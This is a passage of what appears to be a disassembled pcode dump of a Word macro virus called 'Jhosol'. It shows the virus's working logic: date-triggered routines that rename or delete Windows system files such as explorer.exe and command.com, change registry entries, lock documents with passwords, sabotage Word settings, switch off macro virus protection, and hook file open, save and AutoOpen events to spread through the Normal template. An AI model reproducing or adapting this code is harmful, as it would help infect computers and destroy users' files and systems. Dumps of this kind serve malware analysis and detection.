' 	St xp 
' Line #98:
' 	OnError (Resume Next) 
' Line #99:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	St nmth 
' Line #100:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	St nday 
' Line #101:
' 	LitStr 0x0013 "Mess with the best!"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x0016 "RegisteredOrganization"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #102:
' 	LitStr 0x000E "-=- Jhosol -=-"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion"
' 	LitStr 0x000F "RegisteredOwner"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #103:
' 	Ld nmth 
' 	LitDI2 0x000A 
' 	Eq 
' 	Ld nday 
' 	LitDI2 0x0015 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #104:
' 	LitStr 0x0006 "JHOSOL"
' 	LitStr 0x0000 ""
' 	LitStr 0x002F "HKEY_USERS\.Default\Control Panel\International"
' 	LitStr 0x0005 "s1159"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #105:
' 	LitStr 0x0006 "JHOSOL"
' 	LitStr 0x0000 ""
' 	LitStr 0x002F "HKEY_USERS\.Default\Control Panel\International"
' 	LitStr 0x0005 "s2359"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #106:
' 	ElseBlock 
' Line #107:
' 	LitStr 0x0002 "AM"
' 	LitStr 0x0000 ""
' 	LitStr 0x002F "HKEY_USERS\.Default\Control Panel\International"
' 	LitStr 0x0005 "s1159"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #108:
' 	LitStr 0x0002 "PM"
' 	LitStr 0x0000 ""
' 	LitStr 0x002F "HKEY_USERS\.Default\Control Panel\International"
' 	LitStr 0x0005 "s2359"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #109:
' 	EndIfBlock 
' Line #110:
' Line #111:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x0017 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x0006 
' 	Eq 
' 	Or 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x0012 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #112:
' 	LitStr 0x001C "c:\windows\system\epson9.drv"
' 	ArgsCall Kill 0x0001 
' Line #113:
' 	LitStr 0x001D "c:\windows\system\netbeui.vxd"
' 	LitStr 0x001D "c:\windows\system\iuebten.vxd"
' 	Name 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x0019 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x001C 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #116:
' 	LitStr 0x001C "c:\windows\system\cm8330.drv"
' 	LitStr 0x001C "c:\windows\system\0338mc.drv"
' 	Name 
' Line #117:
' 	LitStr 0x001C "c:\windows\system\cm8330.vxd"
' 	LitStr 0x001C "c:\windows\system\0338mc.vxd"
' 	Name 
' Line #118:
' 	EndIfBlock 
' Line #119:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x001B 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x000D 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #120:
' 	LitStr 0x001D "c:\windows\system\sis597m.drv"
' 	LitStr 0x001D "c:\windows\system\m795sis.drv"
' 	Name 
' Line #121:
' 	LitStr 0x001D "c:\windows\system\sis597m.vxd"
' 	LitStr 0x001D "c:\windows\system\m795sis.vxd"
' 	Name 
' Line #122:
' 	LitStr 0x0017 "c:\windows\explorer.exe"
' 	LitStr 0x0017 "c:\windows\rerolpxe.exe"
' 	Name 
' Line #123:
' 	EndIfBlock 
' Line #124:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x0020 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #125:
' 	LitStr 0x001B "c:\windows\system\dplay.dll"
' 	LitStr 0x001B "c:\windows\system\yalpd.dll"
' 	Name 
' Line #126:
' 	LitStr 0x001C "c:\windows\system\dplayx.dll"
' 	LitStr 0x001C "c:\windows\system\xyalpd.dll"
' 	Name 
' Line #127:
' 	EndIfBlock 
' Line #128:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld nday 
' 	Eq 
' 	IfBlock 
' Line #129:
' 	LitStr 0x001B "c:\windows\system\vmm32.vxd"
' 	LitStr 0x001B "c:\windows\system\23mmv.vxd"
' 	Name 
' Line #130:
' 	EndIfBlock 
' Line #131:
' 	Ld nday 
' 	Ld nmth 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x0008 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x000E 
' 	Eq 
' 	Or 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x0016 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #132:
' 	LitStr 0x001A "c:\windows\system\sage.dll"
' 	LitStr 0x001A "c:\windows\system\egas.dll"
' 	Name 
' Line #133:
' 	EndIfBlock 
' Line #134:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld nmth 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x000C 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #135:
' 	LitStr 0x001E "c:\windows\system\comdlg32.dll"
' 	LitStr 0x001E "c:\windows\system\23gldmoc.dll"
' 	Name 
' Line #136:
' 	EndIfBlock 
' Line #137:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld nmth 
' 	Eq 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld nday 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #138:
' 	LitStr 0x001E "c:\windows\command\command.com"
' 	LitStr 0x001E "c:\windows\command\dnammoc.com"
' 	Name 
' Line #139:
' 	LitStr 0x000E "c:\command.com"
' 	LitStr 0x000E "c:\dnammoc.com"
' 	Name 
' Line #140:
' 	EndIfBlock 
' Line #141:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x0010 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #142:
' 	LitStr 0x0001 "$"
' 	LitStr 0x0000 ""
' 	LitStr 0x002F "HKEY_USERS\.Default\Control Panel\International"
' 	LitStr 0x0008 "sDecimal"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #143:
' 	LitStr 0x001B "c:\windows\system\mouse.drv"
' 	LitStr 0x001B "c:\windows\system\esuom.drv"
' 	Name 
' Line #144:
' 	EndIfBlock 
' Line #145:
' 	Ld nmth 
' 	LitDI2 0x000C 
' 	Eq 
' 	Ld nday 
' 	LitDI2 0x000A 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #146:
' 	LitStr 0x000A "DOS=SINGLE"
' 	LitStr 0x0000 ""
' 	LitStr 0x0056 "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\MS-DOSOptions\DOSSettings"
' 	LitStr 0x000A "Config.Sys"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #147:
' 	EndIfBlock 
' Line #148:
' 	LineCont 0x0004 16 00 08 00
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x0005 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x000F 
' 	Eq 
' 	Or 
' 	Ld getcode 
' 	LitDI2 0x000A 
' 	Eq 
' 	Or 
' 	Ld getcode 
' 	LitDI2 0x001D 
' 	Eq 
' 	Or 
' 	Paren 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #149:
' 	Ld xp 
' 	Ld ActiveDocument 
' 	MemSt Password 
' Line #150:
' 	EndIfBlock 
' Line #151:
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x000A 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x001E 
' 	Eq 
' 	Or 
' 	Paren 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #152:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #153:
' 	LitVarSpecial (True)
' 	MemStWith PrintDraft 
' Line #154:
' 	LitVarSpecial (True)
' 	MemStWith PrintFieldCodes 
' Line #155:
' 	LitVarSpecial (True)
' 	MemStWith PrintHiddenText 
' Line #156:
' 	LitVarSpecial (False)
' 	MemStWith PrintDrawingObjects 
' Line #157:
' 	EndWith 
' Line #158:
' 	EndIfBlock 
' Line #159:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #160:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	With 
' Line #161:
' 	Ld wdOrientLandscape 
' 	MemStWith Orientation 
' Line #162:
' 	EndWith 
' Line #163:
' 	EndIfBlock 
' Line #164:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x0003 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x0004 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #165:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	With 
' Line #166:
' 	LitR8 0x0000 0x0000 0x0000 0x4015 
' 	ArgsLd InchesToPoints 0x0001 
' 	MemStWith TopMargin 
' Line #167:
' 	EndWith 
' Line #168:
' 	EndIfBlock 
' Line #169:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x0005 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #170:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	With 
' Line #171:
' 	LitR8 0x0000 0x0000 0x0000 0x4015 
' 	ArgsLd InchesToPoints 0x0001 
' 	MemStWith BottomMargin 
' Line #172:
' 	EndWith 
' Line #173:
' 	EndIfBlock 
' Line #174:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x0006 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #175:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	With 
' Line #176:
' 	LitDI2 0x0004 
' 	ArgsLd InchesToPoints 0x0001 
' 	MemStWith LeftMargin 
' Line #177:
' 	EndWith 
' Line #178:
' 	EndIfBlock 
' Line #179:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x0007 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #180:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	With 
' Line #181:
' 	LitDI2 0x0005 
' 	ArgsLd InchesToPoints 0x0001 
' 	MemStWith RightMargin 
' Line #182:
' 	EndWith 
' Line #183:
' 	EndIfBlock 
' Line #184:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x0008 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #185:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	With 
' Line #186:
' 	LitDI2 0x000D 
' 	ArgsLd InchesToPoints 0x0001 
' 	MemStWith PageWidth 
' Line #187:
' 	EndWith 
' Line #188:
' 	EndIfBlock 
' Line #189:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x0009 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #190:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	With 
' Line #191:
' 	LitR8 0x0000 0x0000 0x0000 0x4025 
' 	ArgsLd InchesToPoints 0x0001 
' 	MemStWith PageHeight 
' Line #192:
' 	EndWith 
' Line #193:
' 	EndIfBlock 
' Line #194:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x001A 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #195:
' 	StartWithExpr 
' 	Ld ActiveWindow 
' 	With 
' Line #196:
' 	LitVarSpecial (False)
' 	MemStWith DisplayHorizontalScrollBar 
' Line #197:
' 	LitVarSpecial (False)
' 	MemStWith DisplayVerticalScrollBar 
' Line #198:
' 	LitVarSpecial (False)
' 	MemStWith DisplayVerticalRuler 
' Line #199:
' 	EndWith 
' Line #200:
' 	EndIfBlock 
' Line #201:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x000B 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #202:
' 	LitVarSpecial (False)
' 	LitStr 0x000A "Formatting"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #203:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Standard"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Visible 
' Line #204:
' 	EndIfBlock 
' Line #205:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x000C 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #206:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #207:
' 	LitVarSpecial (True)
' 	MemStWith PrintReverse 
' Line #208:
' 	EndWith 
' Line #209:
' 	EndIfBlock 
' Line #210:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x000D 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #211:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #212:
' 	LitVarSpecial (False)
' 	MemStWith PrintBackground 
' Line #213:
' 	EndWith 
' Line #214:
' 	EndIfBlock 
' Line #215:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x000E 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #216:
' 	LitDI2 0x0008 
' 	LitStr 0x000A "Formatting"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #217:
' 	EndIfBlock 
' Line #218:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x000F 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #219:
' 	LitDI2 0x0006 
' 	LitStr 0x000A "Formatting"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #220:
' 	EndIfBlock 
' Line #221:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x001B 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #222:
' 	LitDI2 0x0004 
' 	LitStr 0x000A "Formatting"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #223:
' 	EndIfBlock 
' Line #224:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x0025 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x0030 
' 	Eq 
' 	Or 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x0032 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #225:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #226:
' 	Ld wdToggleCase 
' 	Ld Selection 
' 	MemLd Range 
' 	MemSt Case 
' Line #227:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveRight 0x0002 
' Line #228:
' 	EndIfBlock 
' Line #229:
' 	LineCont 0x0004 16 00 08 00
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x0013 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x001D 
' 	Eq 
' 	Or 
' 	Ld getcode 
' 	LitDI2 0x0031 
' 	Eq 
' 	Or 
' 	Ld getcode 
' 	LitDI2 0x001D 
' 	Eq 
' 	Or 
' 	Paren 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #230:
' 	LitStr 0x0006 "lasiov"
' 	ParamNamed Password 
' 	LitVarSpecial (False)
' 	ParamNamed NoReset 
' 	Ld wdAllowOnlyRevisions 
' 	ParamNamed TypeOf 
' 	Ld ActiveDocument 
' 	ArgsMemCall Protect 0x0003 
' Line #231:
' 	EndIfBlock 
' Line #232:
' 	LineCont 0x0004 16 00 08 00
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x002F 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x0033 
' 	Eq 
' 	Or 
' 	Ld getcode 
' 	LitDI2 0x0031 
' 	Eq 
' 	Or 
' 	Ld getcode 
' 	LitDI2 0x001D 
' 	Eq 
' 	Or 
' 	Paren 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #233:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd PageSetup 
' 	MemLd TextColumns 
' 	With 
' Line #234:
' 	LitDI2 0x0002 
' 	ParamNamed NumColumns 
' 	ArgsMemCallWith SetCount 0x0001 
' Line #235:
' 	EndWith 
' Line #236:
' 	EndIfBlock 
' Line #237:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitDI2 0x0064 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x0030 
' 	Eq 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x002E 
' 	Eq 
' 	Or 
' 	ArgsLd getcode 0x0000 
' 	LitDI2 0x002B 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #238:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #239:
' 	Ld wdUpperCase 
' 	Ld Selection 
' 	MemLd Range 
' 	MemSt Case 
' Line #240:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveRight 0x0002 
' Line #241:
' 	EndIfBlock 
' Line #242:
' 	LitStr 0x0003 "STI"
' 	ParamNamed New 
' 	LitStr 0x0005 "DWC-T"
' 	ParamNamed Value 
' 	Ld AutoCorrect 
' 	MemLd Entries 
' 	ArgsMemCall Add 0x0002 
' Line #243:
' 	LitStr 0x0003 "AMA"
' 	ParamNamed New 
' 	LitStr 0x0005 "DWC-T"
' 	ParamNamed Value 
' 	Ld AutoCorrect 
' 	MemLd Entries 
' 	ArgsMemCall Add 0x0002 
' Line #244:
' 	LitStr 0x0002 "UB"
' 	ParamNamed New 
' 	LitStr 0x0005 "DWC-T"
' 	ParamNamed Value 
' 	Ld AutoCorrect 
' 	MemLd Entries 
' 	ArgsMemCall Add 0x0002 
' Line #245:
' 	LitStr 0x0013 "University of Bohol"
' 	ParamNamed New 
' 	LitStr 0x0013 "Divine Word College"
' 	ParamNamed Value 
' 	Ld AutoCorrect 
' 	MemLd Entries 
' 	ArgsMemCall Add 0x0002 
' Line #246:
' 	LitStr 0x001B "System Technology Institute"
' 	ParamNamed New 
' 	LitStr 0x0013 "Divine Word College"
' 	ParamNamed Value 
' 	Ld AutoCorrect 
' 	MemLd Entries 
' 	ArgsMemCall Add 0x0002 
' Line #247:
' 	LitStr 0x001D "Bohol Institute of Technology"
' 	ParamNamed New 
' 	LitStr 0x0013 "Divine Word College"
' 	ParamNamed Value 
' 	Ld AutoCorrect 
' 	MemLd Entries 
' 	ArgsMemCall Add 0x0002 
' Line #248:
' 	LitStr 0x0003 "BIT"
' 	ParamNamed New 
' 	LitStr 0x0005 "DWC-T"
' 	ParamNamed Value 
' 	Ld AutoCorrect 
' 	MemLd Entries 
' 	ArgsMemCall Add 0x0002 
' Line #249:
' 	LitStr 0x0007 "CVSCAFT"
' 	ParamNamed New 
' 	LitStr 0x0005 "DWC-T"
' 	ParamNamed Value 
' 	Ld AutoCorrect 
' 	MemLd Entries 
' 	ArgsMemCall Add 0x0002 
' Line #250:
' 	EndSub 
' Line #251:
' Line #252:
' 	FuncDefn (Sub FileOpen())
' Line #253:
' 	OnError (Resume Next) 
' Line #254:
' 	Ld NormalTemplate 
' 	ArgsCall (Call) RemoveMacro 0x0001 
' Line #255:
' 	ArgsCall (Call) Jhosol 0x0000 
' Line #256:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #257:
' 	Ld NormalTemplate 
' 	ArgsCall (Call) RemoveMacro 0x0001 
' Line #258:
' 	ArgsCall (Call) Jhosol 0x0000 
' Line #259:
' 	EndSub 
' Line #260:
' Line #261:
' 	FuncDefn (Sub FileClose())
' Line #262:
' 	OnError (Resume Next) 
' Line #263:
' 	Ld NormalTemplate 
' 	ArgsCall (Call) RemoveMacro 0x0001 
' Line #264:
' 	ArgsCall (Call) Jhosol 0x0000 
' Line #265:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #266:
' 	EndSub 
' Line #267:
' Line #268:
' 	FuncDefn (Sub AddStr(ByVal obj As Object, str As String))
' Line #269:
' 	OnError (Resume Next) 
' Line #270:
' 	Ld str 
' 	Ld obj 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #271:
' 	EndSub 
' Line #272:
' Line #273:
' 	FuncDefn (Sub FileSaveAs())
' Line #274:
' 	OnError (Resume Next) 
' Line #275:
' 	Ld NormalTemplate 
' 	ArgsCall (Call) RemoveMacro 0x0001 
' Line #276:
' 	ArgsCall (Call) Jhosol 0x0000 
' Line #277:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #278:
' 	EndSub 
' Line #279:
' Line #280:
' 	FuncDefn (Sub FileSave())
' Line #281:
' 	OnError (Resume Next) 
' Line #282:
' 	Ld NormalTemplate 
' 	ArgsCall (Call) RemoveMacro 0x0001 
' Line #283:
' 	ArgsCall (Call) Jhosol 0x0000 
' Line #284:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #285:
' 	EndSub 
' Line #286:
' Line #287:
' 	FuncDefn (Private Function shield())
' Line #288:
' 	OnError (Resume Next) 
' Line #289:
' 	LitStr 0x0000 ""
' 	St myshield$ 
' Line #290:
' 	LitStr 0x001B "c:\windows\system\vnetx.vxd"
' 	ArgsLd Dir 0x0001 
' 	St myshield$ 
' Line #291:
' 	Ld myshield$ 
' 	LitStr 0x0009 "vnetx.vxd"
' 	Eq 
' 	IfBlock 
' Line #292:
' 	LitVarSpecial (True)
' 	St shield 
' Line #293:
' 	ExitFunc 
' Line #294:
' 	EndIfBlock 
' Line #295:
' 	EndFunc 
' Line #296:
' Line #297:
' 	FuncDefn (Private Function shield2())
' Line #298:
' 	OnError (Resume Next) 
' Line #299:
' 	LitStr 0x0000 ""
' 	St myshield$ 
' Line #300:
' 	LitStr 0x001D "c:\windows\system\christx.vxd"
' 	ArgsLd Dir 0x0001 
' 	St myshield$ 
' Line #301:
' 	Ld myshield$ 
' 	LitStr 0x000B "christx.vxd"
' 	Eq 
' 	IfBlock 
' Line #302:
' 	LitVarSpecial (True)
' 	St shield2 
' Line #303:
' 	ExitFunc 
' Line #304:
' 	EndIfBlock 
' Line #305:
' 	EndFunc 
' Line #306:
' 	FuncDefn (Sub ToolsMacro())
' Line #307:
' Line #308:
' 	EndSub 
' Line #309:
' Line #310:
' 	FuncDefn (Sub ViewVBCode())
' Line #311:
' Line #312:
' 	EndSub 
' Line #313:
' Line #314:
' 	FuncDefn (Sub FileTemplates())
' Line #315:
' Line #316:
' 	EndSub 
' Line #317:
' Line #318:
' 	FuncDefn (Sub ToolsOptions())
' Line #319:
' 	OnError (Resume Next) 
' Line #320:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #321:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #322:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #323:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #324:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #325:
' 	EndSub 
' Line #326:
' Line #327:
' 	FuncDefn (Sub HelpAbout())
' Line #328:
' 	OnError (Resume Next) 
' Line #329:
' 	LineCont 0x0004 10 00 04 00
' 	LitStr 0x0019 "JHOSOL SOFTWARE SOLUTIONS"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x001A "(E-mail: jhosol@yahoo.com)"
' 	Concat 
' 	Ld vbOKOnly 
' 	Ld vbExclamation 
' 	Add 
' 	LitStr 0x0014 "Hacker's Information"
' 	ArgsLd MsgBox 0x0003 
' 	St X 
' Line #330:
' 	EndSub 
' Line #331:
' Line #332:
' 	FuncDefn (Sub MyMacroOpen())
' Line #333:
' 	OnError (Resume Next) 
' Line #334:
' 	LitStr 0x0006 "102173"
' 	St vp 
' Line #335:
' 	LitStr 0x000E "Enter password"
' 	LitStr 0x0018 "View Jhosol's Viral Code"
' 	ArgsLd InputBox 0x0002 
' 	Ld vp 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' 	EndIf 
' Line #336:
' 	EndSub 
' Line #337:
' Line #338:
' 	FuncDefn (Private Sub AddKey())
' Line #339:
' 	OnError (Resume Next) 
' Line #340:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #341:
' 	LineCont 0x0004 0E 00 04 00
' 	Ld wdKeyControl 
' 	Ld wdKeyAlt 
' 	Ld wdKeyJ 
' 	ArgsLd BuildKeyCode 0x0003 
' 	ParamNamed KeyCode 
' 	Ld wdKeyCategoryMacro 
' 	ParamNamed KeyCategory 
' 	LitStr 0x000B "MyMacroOpen"
' 	ParamNamed Command 
' 	Ld KeyBindings 
' 	ArgsMemCall Add 0x0003 
' Line #342:
' 	EndSub 
' Line #343:
' Line #344:
' 	FuncDefn (Sub AutoOpen())
' Line #345:
' 	OnError (Resume Next) 
' Line #346:
' 	Ld NormalTemplate 
' 	ArgsCall (Call) RemoveMacro 0x0001 
' Line #347:
' 	ArgsCall (Call) Jhosol 0x0000 
' Line #348:
' 	EndSub 
' Line #349:
' Line #350:
' 	FuncDefn (Sub AutoExec())
' Line #351:
' 	OnError (Resume Next) 
' Line #352:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #353:
' 	ArgsCall (Call) AddKey 0x0000 
' Line #354:
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	St nmth 
' Line #355:
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	St nday 
' Line #356:
' 	Ld nmth 
' 	LitDI2 0x000C 
' 	Eq 
' 	Paren 
' 	Ld nday 
' 	LitDI2 0x0019 
' 	Eq 
' 	Paren 
' 	And 
' 	Paren 
' 	Ld nmth 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
